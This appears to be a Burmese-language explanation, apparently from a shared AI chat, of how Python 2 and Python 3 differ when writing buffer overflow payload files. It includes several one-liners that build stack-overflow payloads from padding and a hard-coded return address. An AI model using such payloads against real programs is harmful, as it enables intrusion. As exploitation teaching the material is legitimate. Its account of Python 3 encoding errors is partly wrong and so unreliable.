
Python 2 နဲ့ Python 3 မှာ `print` statement/function ကွဲပြားမှုကြောင့် payload file အထွက်တွေ မတူညီပါ။

```
python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*136 + p64(0x4011f7))" > payload
```

## Python 2 မှာ:
```python
python2 -c 'print "A" * 28 + "\x82\x91\x04\x08" + "AAAA" + "BBBB" + "CCCC"' > payload
```
- **String literals** က `bytes` type (Python 2 မှာ `str`)
- `print` statement က string ကို raw bytes အဖြစ် output ထုတ်ပေး
- **Result**: `41414141... (28 bytes) + 82910408 + 41414141 + 42424242 + 43434343`

## Python 3 မှာ:
```python
python3 -c 'print( "A" * 28 + "\x82\x91\x04\x08" + "AAAA" + "BBBB" + "CCCC")' > payload
```
- **String literals** က `str` type (Unicode)
- `print()` function က Unicode string ကို encode လုပ်ပြီးမှ output ထုတ်
- **Problem**: `\x82\x91\x04\x08` ကြောင့် encoding error ဖြစ်နိုင်
- **Default encoding** က UTF-8 ဖြစ်တဲ့အတွက် invalid bytes တွေကို replace လုပ်မယ်

## အဓိက ကွာခြားချက်များ:

1. **Data Type**
   - Python 2: `bytes` 
   - Python 3: `unicode string`

2. **Encoding Handling**
   - Python 2: Raw bytes အတိုင်း output
   - Python 3: UTF-8 encode လုပ်ပြီးမှ output

3. **Output Size**
   - Python 2: 28 + 4 + 4 + 4 + 4 = 44 bytes exactly
   - Python 3: Encoding ကြောင့် size ပြောင်းသွားနိုင်

## Python 3 မှာ မှန်ကန်စေရန်:
```python
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 28 + b"\x82\x91\x04\x08" + b"AAAA" + b"BBBB" + b"CCCC")' > payload
```

ဒါမှမဟုတ်
```python
python3 -c 'print("A" * 28 + "\x82\x91\x04\x08" + "AAAA" + "BBBB" + "CCCC", end="")' | iconv -f utf-8 -t latin1 > payload
```

**သတိပြုရန်**: Buffer overflow exploitation အတွက် Python 2 ကို သုံးတာက ပိုသင့်တော်ပါတယ်။

https://chat.deepseek.com/share/e6ze5fitrx5wqb1m1u

---



